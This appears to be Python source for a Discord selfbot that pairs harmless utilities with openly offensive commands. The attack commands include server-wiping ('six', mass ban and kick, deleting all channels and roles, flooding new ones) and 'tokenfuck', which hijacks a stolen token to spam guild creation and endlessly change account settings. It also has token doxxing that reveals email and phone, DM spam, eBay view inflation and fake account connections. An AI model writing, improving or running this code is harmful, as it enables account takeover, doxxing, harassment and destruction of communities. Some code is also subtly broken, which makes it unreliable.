@Client.command()
async def util(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed()
    em.set_author(name="𝐔𝐓𝐈𝐋")
    em.add_field(name="`💔𝐛𝐢𝐭𝐥𝐲`",value="Shorten ur link using bitly [Must have bitly api key set in config.json file]",inline=False)
    em.add_field(name="`💔𝐭𝐢𝐧𝐲𝐮𝐫𝐥`",value="Shorten ur link using tinyurl",inline=False)
    em.add_field(name="`💔𝐛𝐚𝐜𝐤𝐮𝐩-𝐟`",value="Backup your friends name and discrim",inline=False)
    em.add_field(name="`💔𝐚𝐮𝐭𝐨-𝐛𝐮𝐦𝐩`",value="Automatically bump server to disboard.org [serversonly]",inline=False)
    em.add_field(name="`💔𝐦𝐚𝐜`",value="Lookup a bit of info about a MAC (ie: !mac xx:xx:xx:xx:xx:xx)",inline=False)
    em.add_field(name="`💔𝐜𝐨𝐩𝐲`",value="Copies guild channels, categories, voice channels and makes them in a new one",inline=False)
    em.add_field(name="`💔𝐞𝐧𝐜𝐨𝐝𝐞`",value="Encode a string to base64 ascii",inline=False)
    em.add_field(name="`💔𝐝𝐞𝐜𝐨𝐝𝐞`",value="Decode a string from base64 to regular text",inline=False)
    em.add_field(name="`💔𝐞𝐭𝐡`",value="Display current Ethereum price",inline=False)
    em.add_field(name="`💔𝐛𝐭𝐜`",value="Display current Bitcoin price",inline=False)
    em.set_image(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    em.set_footer(text="by Pix⁶ⁱˣ#0011")
    em.set_thumbnail(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    await ctx.send(embed=em)
@Client.command()
async def hacking(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed()
    em.set_author(name="𝐇𝐀𝐂𝐊𝐈𝐍𝐆")
    em.add_field(name="`💔𝐭𝐨𝐤𝐞𝐧𝐢𝐧𝐟𝐨`",value="Display various information about the token",inline=False)
    em.add_field(name="`💔𝐭𝐨𝐤𝐞𝐧𝐟𝐮𝐜𝐤`",value="Crash, glitch screen of a token, all in discord",inline=False)
    em.add_field(name="`💔𝐠𝐞𝐨𝐢𝐩`",value="Display various information about the IP",inline=False)
    em.add_field(name="`💔𝐠𝐦𝐚𝐢𝐥-𝐛𝐨𝐦𝐛`",value="Spam a gmail [When you run it look in console]",inline=False)
    em.add_field(name="`💔𝐧𝐢𝐭𝐫𝐨`",value="Generate a random nitro code",inline=False)
    em.add_field(name="`💔𝐩𝐫𝐨𝐱𝐢𝐞𝐬`",value="Scraps HTTP/HTTPS/SOCKS4/SOCKS5 proxies",inline=False)
    em.add_field(name="`💔𝐚𝐝𝐝𝐫𝐞𝐬𝐬(text)`",value="Generates fake address based on the text you specify",inline=False)
    em.add_field(name="`💔𝐦𝐚𝐬𝐬𝐥𝐨𝐠𝐢𝐧`",value="Allows you to mass-login in bot/user tokens [Choices can be: user and bot]",inline=False)
    em.set_image(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    em.set_footer(text="by Pix⁶ⁱˣ#0011")
    em.set_thumbnail(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    await ctx.send(embed=em)
@Client.command()
async def wizzing(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed()
    em.set_author(name="𝐖𝐈𝐙𝐙𝐈𝐍𝐆")
    em.add_field(name="`💔𝐒𝐈𝐗`",value="Shits on the server",inline=False)
    em.add_field(name="`💔𝐝𝐦𝐚𝐥𝐥`",value="10 second cooldown but u might get disabled",inline=False)
    em.add_field(name="`💔𝐦𝐚𝐬𝐬𝐁`",value="Ban all the users in that guild",inline=False)
    em.add_field(name="`💔𝐦𝐚𝐬𝐬𝐊`",value="Kick all the users in that guild",inline=False)
    em.add_field(name="`💔𝐦𝐚𝐬𝐬𝐑`",value="Mass create roles",inline=False)
    em.add_field(name="`💔𝐦𝐚𝐬𝐬𝐂`",value="Mass create channels",inline=False)
    em.add_field(name="`💔𝐝𝐞𝐥𝐑`",value="Delete all the roles",inline=False)
    em.add_field(name="`💔𝐝𝐞𝐥𝐂`",value="Delete all the channels",inline=False)
    em.add_field(name="`💔𝐦𝐚𝐬𝐬𝐔𝐧`",value="Unban every member",inline=False)
    em.set_image(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    em.set_footer(text="by Pix⁶ⁱˣ#0011")
    em.set_thumbnail(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    await ctx.send(embed=em)


@Client.command(aliases=['shorteen'])
async def bitly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if bitly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}Bitly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}') as req:
                    r = await req.read()
                    r = json.loads(r) 
            new = r['data']['url']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            await ctx.send(embed=em)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{req.text}"+Fore.RESET)

@Client.command()
async def cuttly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if cuttly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}Cutt.ly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'https://cutt.ly/api/api.php?key={cuttly_key}&short={link}')
            r = req.json()
            new = r['url']['shortLink']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(new)    
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{req.text}"+Fore.RESET)

@Client.command() 
async def cat(ctx): # b'\xfc'
    await ctx.message.delete()
    if cat_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}Cat API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f"fhttps://api.thecatapi.com/v1/images/search?format=json&x-api-key={cat_key}")
            r = req.json()
            em = discord.Embed()
            em.set_image(url=str(r[0]["url"]))
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(str(r[0]["url"]))
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{req.text}"+Fore.RESET)

@Client.command()
async def dog(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed()
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))    

@Client.command()
async def fox(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title="Random fox image", color=16202876)
    em.set_image(url=r["image"])
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])    

@Client.command()
async def encode(ctx, string): # b'\xfc'
    await ctx.message.delete()
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await ctx.send(encoded_stuff) 

@Client.command()
async def decode(ctx, string): # b'\xfc'+
    await ctx.message.delete()  
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.send(decoded_stuff)

@Client.command(name='ebay-view', aliases=['ebay-view-bot', 'ebayviewbot', 'ebayview'])
async def _ebay_view(ctx, url, views: int): # b'\xfc'
    await ctx.message.delete()
    start_time = datetime.datetime.now()
    def EbayViewer(url, views):
        headers = {
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36",
           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }        
        for _i in range(views):
            requests.get(url, headers=headers)
    EbayViewer(url, views)
    elapsed_time = datetime.datetime.now() - start_time
    em = discord.Embed(title='Ebay View Bot')
    em.add_field(name='Views sent', value=views, inline=False)
    em.add_field(name='Elapsed time', value=elapsed_time, inline=False)
    await ctx.send(embed=em)

@Client.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@Client.command()
async def pingweb(ctx, website = None): # b'\xfc'
    await ctx.message.delete()
    if website is None: 
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)
        if r == 404:
            await ctx.send(f'Site is down, responded with a status code of {r}', delete_after=3)
        else:
            await ctx.send(f'Site is up, responded with a status code of {r}', delete_after=3)       

@Client.command()
async def tweet(ctx, username: str, *, message: str): # b'\xfc'
    await ctx.message.delete()
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            em = discord.Embed()
            em.set_image(url=res["message"])
            await ctx.send(embed=em)

@Client.command()
async def revav(ctx, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)

@Client.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
	    format = "png"
    avatar = user.avatar_url_as(format = format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file = discord.File(file, f"Avatar.{format}"))      

@Client.command(aliases=['ri', 'role'])
async def roleinfo(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = "{} ({} days ago)".format(role_created, since_created)
    users = len([x for x in guild.members if role in x.roles])
    if str(role.colour) == "#000000":
        colour = "default"
        color = ("#%06x" % random.randint(0, 0xFFFFFF))
        color = int(colour[1:], 16)
    else:
        colour = str(role.colour).upper()
        color = role.colour
    em = discord.Embed(colour=color)
    em.set_author(name=f"Name: {role.name}"
    f"\nRole ID: {role.id}")
    em.add_field(name="Users", value=users)
    em.add_field(name="Mentionable", value=role.mentionable)
    em.add_field(name="Hoist", value=role.hoist)
    em.add_field(name="Position", value=role.position)
    em.add_field(name="Managed", value=role.managed)
    em.add_field(name="Colour", value=colour)
    em.add_field(name='Creation Date', value=created_on)
    await ctx.send(embed=em)

@Client.command()
async def whois(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author      
    date_format = "%a, %d %b %Y %I:%M %p"
    em = discord.Embed(description=user.mention)
    em.set_author(name=str(user), icon_url=user.avatar_url)
    em.set_thumbnail(url=user.avatar_url)
    em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
    em.add_field(name="Join position", value=str(members.index(user)+1))
    em.add_field(name="Registered", value=user.created_at.strftime(date_format))
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        em.add_field(name="Roles [{}]".format(len(user.roles)-1), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
    em.add_field(name="Guild permissions", value=perm_string, inline=False)
    em.set_footer(text='ID: ' + str(user.id))
    return await ctx.send(embed=em)

@Client.command()
async def minesweeper(ctx, size: int = 5): # b'\xfc'
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)

@Client.command()
async def combine(ctx, name1, name2): # b'\xfc'
    await ctx.message.delete()
    name1letters = name1[:round(len(name1) / 2)]
    name2letters = name2[round(len(name2) / 2):]
    ship = "".join([name1letters, name2letters])
    emb = (discord.Embed(description=f"{ship}"))
    emb.set_author(name=f"{name1} + {name2}")
    await ctx.send(embed=emb)       

@Client.command(name='1337-speak', aliases=['1337speak'])
async def _1337_speak(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3')\
            .replace('E', '3').replace('i', '!').replace('I', '!')\
            .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'`{text}`')

@Client.command(aliases=['dvwl'])
async def devowel(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    dvl = text.replace('a', '').replace('A', '').replace('e', '')\
            .replace('E', '').replace('i', '').replace('I', '')\
            .replace('o', '').replace('O', '').replace('u', '').replace('U', '')
    await ctx.send(dvl)

@Client.command()
async def blank(ctx): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.CYAN}You didnt put your password in the config.json file"+Fore.RESET)
    else:  
        password = config.get('password')
        with open('Images/Avatars/Transparent.png', 'rb') as f:
          try:      
             await Client.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
          except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)

@Client.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.CYAN}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
          r = requests.get(user.avatar_url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
              await Client.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)

@Client.command(name='set-pfp', aliases=['setpfp', 'pfpset'])
async def _set_pfp(ctx, *, url): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.CYAN}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
          r = requests.get(url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png'   ).convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await Client.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)

@Client.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0x0000)
    await ctx.send(embed=em)

@Client.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house): # b'\xfc'
    await ctx.message.delete()
    request = requests.Session()
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }    
    if house == "bravery":
      payload = {'house_id': 1}
    elif house == "brilliance":
      payload = {'house_id': 2}
    elif house == "balance":
      payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)

@Client.command(aliases=['tokenfucker', 'disable', 'crash']) 
async def tokenfuck(ctx, _token): # b'\xfc' 
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "6ix NUKED U",
        'region': "europe"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)
            else:
                break   

@Client.command()
async def masslogin(ctx, choice = None): # b'\xfc'
    await ctx.message.delete()
    _masslogin(choice)

@Client.command()
async def masscon(ctx, _type, amount: int, *, name=None): # b'\xfc'
    await ctx.message.delete()
    payload = {
        'name': name,
        'visibility': 1 
    }
    headers = {
        'Authorization': token,
        'Content-Type':'application/json', 
    }
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        print(f'Avaliable connections: {avaliable}')
    for _i in range(amount):
        try:
            ID = random.randint(10000000, 90000000)
            time.sleep(5) 
            r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
            if r.status_code == 200:
                print(f"[{Fore.GREEN}+{Fore.RESET}] New connection added!")
            else:
                print(f"[{Fore.RED}-{Fore.RESET}] Couldnt add connection!");break
        except (Exception, ValueError) as e:
            print(e);break
    print(f"[{Fore.GREEN}+{Fore.RESET}] Finished adding connections!")

@Client.command(aliases=['fakeconnection', 'spoofconnection'])
async def fakenet(ctx, _type, *, name = None): # b'\xfc'
    await ctx.message.delete()
    ID  = random.randrange(10000000, 90000000)
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    payload = {
        'name': name,
		'visibility': 1
	}
    headers = {
		'Authorization': token,
        'Content-Type':'application/json', 
	}
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after = 3)
    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
    if r.status_code == 200:            
        await ctx.send(f"Added connection: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after = 3)
    else:
        await ctx.send('Some error has happened with the endpoint', delete_after = 3)

@Client.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@Client.command()
async def copy(ctx): # b'\xfc'
    await ctx.message.delete()
    await Client.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Client.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
                    if isinstance(chann, discord.Role):
                        await x.create_role(f"{chann}")
    try:                
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@Client.command()
async def six(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="6ix loves wizzing",
            reason="cuz 6ix love wizzing",
            icon="https://cdn.discordapp.com/attachments/699363055930310716/699363355659468910/6IX.png",
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name=RandString())
    for _i in range(250):
        await ctx.guild.create_text_voice(name=RandString())
    for _i in range(250):
        await ctx.guild.create_role(name=RandString(), color=RandomColor())

@Client.command()
async def dmall(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(5)    
            await user.send(message)
        except:
            pass

@Client.command()
async def massB(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    

@Client.command()
async def massK(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    

@Client.command()
async def massR(ctx): # b'\xfc'
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=RandString(), color=RandomColor())
        except:
            return    

@Client.command()
async def massC(ctx): # b'\xfc'
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name=RandString())
        except:
            return

@Client.command()
async def delC(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@Client.command() 
async def delR(ctx): # b'\xfc'
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@Client.command()
async def massUn(ctx): # b'\xfc'
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@Client.command()
async def spam(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@Client.command()
async def dm(ctx, user : discord.Member, *, message): # b'\xfc'
    await ctx.message.delete()
    user = Client.get_user(user.id)
    if ctx.author.id == Client.user.id:
        return
    else:
        try:
            await user.send(message) 
        except:
            pass       

@Client.command(name='get-color', aliases=['color', 'colour', 'sc'])
async def _get_color(ctx, *, color: discord.Colour): # b'\xfc'
    await ctx.message.delete()
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f'Showing Color: {str(color)}')
    em.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em) 

@Client.command()
async def tinyurl(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
    em = discord.Embed()
    em.add_field(name='Shortened link', value=r, inline=False )
    await ctx.send(embed=em)

@Client.command(aliases=['rainbow-role'])
async def rainbow(ctx, *, role): # b'\xfc'
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(10)
        except:
            break

@Client.command(name='8ball')
async def _ball(ctx, *, question): # b'\xfc'
    await ctx.message.delete()
    responses = [
      'That is a resounding no',
      'It is not looking likely',
      'Too hard to tell',
      'It is quite possible',
      'That is a definite yes!',
	  'Maybe',
	  'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    embed.set_footer(text=datetime.datetime.now())
    await ctx.send(embed=embed)

@Client.command(aliases=['slots', 'bet'])
async def slot(ctx): # b'\xfc'
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} No match, you lost"}))

@Client.command()
async def joke(ctx):  # b'\xfc'
    await ctx.message.delete()
    headers = {
        "Accept": "application/json"
    }
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    await ctx.send(r["joke"])

@Client.command(name='auto-bump', aliases=['bump'])
async def _auto_bump(ctx, channelid): # b'\xfc'
    await ctx.message.delete()
    count = 0
    while True:
        try:
            count += 1 
            channel = Client.get_channel(int(channelid))
            await channel.send('!d bump')           
            print(f'{Fore.BLUE}[AUTO-BUMP] {Fore.GREEN}Bump number: {count} sent'+Fore.RESET)
            await asyncio.sleep(7200)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)

@Client.command()
async def tts(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))

@Client.command()
async def upper(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    message = message.upper()
    await ctx.send(message)

@Client.command(aliases=['guildpfp'])
async def guildicon(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)

@Client.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])
async def _backup_f(ctx): # b'\xfc'
    await ctx.message.delete()
    for friend in Client.user.friends:
       friendlist = (friend.name)+'#'+(friend.discriminator)   
